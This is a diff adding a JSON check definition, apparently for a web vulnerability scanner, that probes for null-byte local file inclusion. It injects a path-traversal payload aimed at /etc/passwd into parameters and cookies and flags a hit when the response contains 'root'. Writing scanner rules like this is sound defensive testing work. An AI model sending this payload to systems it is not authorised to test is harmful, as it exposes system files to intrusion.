@@ -1,0 +1,22 @@
+{
+  "name": "Local File Inclusion (Null Byte)",
+  "run_at": "request",
+  "find": "many",
+  "severity": 3,
+  "options": ["injection"],
+  "request": ["parameters", "cookies"],
+  "data": {
+    "inject_value": "../../../../../../../../../../../etc/passwd{null}"
+  },
+  "matches": [
+    {
+      "type": "contains",
+      "location": "body",
+      "match": "0:0:root",
+      "name": "/etc/password disclosure",
+      "options": [
+        "ignore_case"
+      ]
+    }
+  ]
+}
